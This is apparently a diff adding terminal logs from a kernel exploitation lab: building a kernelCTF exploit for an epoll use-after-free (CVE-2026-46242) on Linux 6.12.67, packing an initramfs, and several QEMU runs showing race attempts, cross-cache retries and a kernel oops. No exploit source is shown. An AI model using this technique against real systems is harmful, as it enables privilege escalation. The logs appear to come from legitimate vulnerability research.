@@ -1,0 +1,239 @@
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1896.014
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak...
+Illegal instruction
+~ # 
+
+
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/l7
+make clean
+make
+rm -f exploit exploit_debug
+g++ -isystem kernel-research/libxdk/include -DTARGET_LTS_6_12_67 -std=gnu++17 -static -O2 -Wall exploit.cpp -o exploit -static -Lkernel-research/libxdk/lib -lkernelXDK -lpcp /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier\
+   /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/rootfs/bin/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67$ cp /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier\
+cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/rootfs/bin/
+find . -print0 | cpio --null -ov --format=newc > ../initramfs.cpio1-linux-vm/rootfs
+.ind . -print0 | cpio --null -ov --format=newc > ../initramfs.cpio
+./sys
+./tmp
+./proc
+./bin
+./bin/mv
+./bin/id
+./bin/mount
+./bin/cat
+./bin/mkdir
+./bin/chmod
+./bin/sh
+./bin/uname
+./bin/exploit
+./bin/busybox
+./bin/rm
+./bin/ls
+./bin/whoami
+./bin/dmesg
+./bin/cp
+./bin/echo
+./init
+./dev
+./etc
+38908 blocks
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/rootfs$ 
+
+
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1895.998
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak bypassed (nokaslr assumed).
+[+] kernel_base=ffffffff81000000
+[*] Calibrated close() average: 41177 cycles, threshold set to: 205885 cycles
+[+] race setup done
+[*] racing close-vs-close...
+[*] racer: false-sharing window=10315896 ns -> fire 5157948 ns ahead
+[+] racer: stat done (10 iters) -> locked best range [250,1000] (interrupts=40)
+ 
+[+] racer: stat done (10 iters) -> locked best range [1250,2000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [250,1000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [250,1000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [250,1000] (interrupts=39)
+[-] giving up: 300 s deadline reached (race_retries=14734 cc_retries=1)
+~ # 
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1895.998
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak bypassed (nokaslr assumed).
+[+] kernel_base=ffffffff81000000
+[*] Calibrated close() average: 39112 cycles, threshold set to: 195560 cycles
+[+] race setup done
+[*] racer: false-sharing window=10185061 ns -> fire 5092530 ns ahead
+[*] racing close-vs-close...
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [500,1250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1000,1750] (interrupts=40)
+[-] giving up: 300 s deadline reached (race_retries=14313 cc_retries=1)
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1895.998
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak bypassed (nokaslr assumed).
+[+] kernel_base=ffffffff81000000
+[*] Calibrated close() average: 41891 cycles, threshold set to: 209455 cycles
+[+] race setup done
+[*] racer: false-sharing window=10435191 ns -> fire 5217595 ns ahead
+[*] racing close-vs-close...
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [250,1000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=40)
+^CQEMU: Terminated
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
+i did i manaual exit 
+
+
+
+
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1895.992
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak bypassed (nokaslr assumed).
+[+] kernel_base=ffffffff81000000
+[*] Calibrated close() average: 40798 cycles, threshold set to: 203990 cycles
+[+] race setup done
+[*] racing close-vs-close...
+[*] racer: false-sharing window=1003792 ns -> fire 501896 ns ahead
+[+] racer: stat done (10 iters) -> locked best range [750,2250] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [250,1750] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [250,1750] (interrupts=40)
+[+] race won: retries=9635 launch=7250 cc_retries=1
+[*] cross-cache...
+[-] cross-cache miss (init_task.comm= cc_retries=1)
+[*] retrying cross-cache attack...
+[+] racer: stat done (10 iters) -> locked best range [250,1750] (interrupts=39)
+[+] race won: retries=10644 launch=1028 cc_retries=2
+[*] cross-cache...
+[-] cross-cache miss (init_task.comm= cc_retries=2)
+[*] retrying cross-cache attack...
+[+] race won: retries=10725 launch=553 cc_retries=3
+[*] cross-cache...
+[-] cross-cache miss (init_task.comm= cc_retries=3)
+[*] retrying cross-cache attack...
+[+] racer: stat done (10 iters) -> locked best range [3250,4750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [250,1750] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [1250,2750] (interrupts=39)
+[+] race won: retries=21348 launch=1301 cc_retries=4
+[*] cross-cache...
+[-] cross-cache miss (init_task.comm= cc_retries=4)
+[*] retrying cross-cache attack...
+[+] race won: retries=22520 launch=9750 cc_retries=5
+[*] cross-cache...
+[-] cross-cache miss (init_task.comm= cc_retries=5)
+[*] retrying cross-cache attack...
+[+] racer: stat done (10 iters) -> locked best range [750,2250] (interrupts=40)
+[+] race won: retries=24047 launch=1764 cc_retries=6
+[*] cross-cache...
+[-] cross-cache miss (init_task.comm= cc_retries=6)
+[*] retrying cross-cache attack...
+[+] racer: stat done (10 iters) -> locked best range [4750,6250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [750,2250] (interrupts=39)
+[+] race won: retries=31289 launch=837 cc_retries=7
+[*] cross-cache...
+[  247.403248] BUG: kernel NULL pointer dereference, address: 0000000000000010
+[  247.404696] #PF: supervisor read access in kernel mode
+[  247.404886] #PF: error_code(0x0000) - not-present page
+[  247.405152] PGD 8000000005ab2067 P4D 8000000005ab2067 PUD 5ab7067 PMD 0 
+[  247.405700] Oops: Oops: 0000 [#1] PREEMPT SMP PTI
+[  247.406304] CPU: 1 UID: 0 PID: 67 Comm: exploit Not tainted 6.12.67 #1
+[  247.406535] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[  247.406901] RIP: 0010:ep_show_fdinfo+0x50/0x80
+[  247.407518] Code: e8 f5 f3 cf 00 48 89 c3 48 85 c0 74 3c 48 8b 53 30 4c 8b 43 6c 48 89 ef 8b 4b 68 48 8b 42 28 4c 8b 4a 70 8b 53 38 48 8b 70 28 <8b> 76 10 56 48 c7 c6 18 a7 99 82 ff 70 40 e8 7d 27 fd ff 58 48 8b
+[  247.408133] RSP: 0018:ffffc9000020fd30 EFLAGS: 00010286
+[  247.408395] RAX: ffffffff82c0d088 RBX: ffff88800552a900 RCX: 0000000000000019
+[  247.408685] RDX: 000000000000010d RSI: 0000000000000000 RDI: ffff88800566e000
+[  247.408971] RBP: ffff88800566e000 R08: 0000000000000000 R09: 0000000000000000
+[  247.409274] R10: ffff88800566e000 R11: 0000000000000000 R12: ffff888005418540
+[  247.409543] R13: 0000000000000000 R14: 0000000000000002 R15: ffff888005ac4c00
+[  247.409904] FS:  0000000012eac400(0000) GS:ffff88807cb00000(0000) knlGS:0000000000000000
+[  247.410255] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  247.410491] CR2: 0000000000000010 CR3: 0000000003df8000 CR4: 00000000003006f0
+[  247.410940] Call Trace:
+[  247.412007]  <TASK>
+[  247.412381]  seq_show+0x14f/0x240
+[  247.412627]  seq_read_iter+0x114/0x460
+[  247.412760]  seq_read+0x128/0x1c0
+[  247.412938]  vfs_read+0x117/0x490
+[  247.413045]  ? vfs_write+0x441/0x570
+[  247.413167]  __x64_sys_pread64+0x92/0xd0
+[  247.413321]  do_syscall_64+0x9e/0x1a0
+[  247.413503]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  247.413952] RIP: 0033:0x5578d2
+[  247.414427] Code: 08 0f 85 f1 a7 ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 00 f3 0f 1e fa 55 bf 01 00
+[  247.415040] RSP: 002b:00007fff9f8bfa98 EFLAGS: 00000246 ORIG_RAX: 0000000000000011
+[  247.415329] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00000000005578d2
+[  247.415527] RDX: 0000000000000400 RSI: 00007fff9f8bfb10 RDI: 0000000000000011
+[  247.415776] RBP: 00007fff9f8bfac0 R08: 0000000000000000 R09: 0000000000000000
+[  247.416029] R10: 0000000000000000 R11: 0000000000000246 R12: 000000000000010d
+[  247.416387] R13: 0000000012ec2448 R14: 0000000012ec2450 R15: 0000000012ec23f0
+[  247.416778]  </TASK>
+[  247.417091] Modules linked in:
+[  247.417686] CR2: 0000000000000010
+[  247.418507] ---[ end trace 0000000000000000 ]---
+[  247.418979] RIP: 0010:ep_show_fdinfo+0x50/0x80
+[  247.419234] Code: e8 f5 f3 cf 00 48 89 c3 48 85 c0 74 3c 48 8b 53 30 4c 8b 43 6c 48 89 ef 8b 4b 68 48 8b 42 28 4c 8b 4a 70 8b 53 38 48 8b 70 28 <8b> 76 10 56 48 c7 c6 18 a7 99 82 ff 70 40 e8 7d 27 fd ff 58 48 8b
+[  247.419856] RSP: 0018:ffffc9000020fd30 EFLAGS: 00010286
+[  247.420074] RAX: ffffffff82c0d088 RBX: ffff88800552a900 RCX: 0000000000000019
+[  247.420389] RDX: 000000000000010d RSI: 0000000000000000 RDI: ffff88800566e000
+[  247.420643] RBP: ffff88800566e000 R08: 0000000000000000 R09: 0000000000000000
+[  247.420907] R10: ffff88800566e000 R11: 0000000000000000 R12: ffff888005418540
+[  247.421155] R13: 0000000000000000 R14: 0000000000000002 R15: ffff888005ac4c00
+[  247.421395] FS:  0000000012eac400(0000) GS:ffff88807cb00000(0000) knlGS:0000000000000000
+[  247.421656] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  247.421859] CR2: 0000000000000010 CR3: 0000000003df8000 CR4: 00000000003006f0
+[  247.422241] note: exploit[67] exited with irqs disabled
+[  247.424859] exploit (67) used greatest stack depth: 13192 bytes left
+
+^CQEMU: Terminated
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
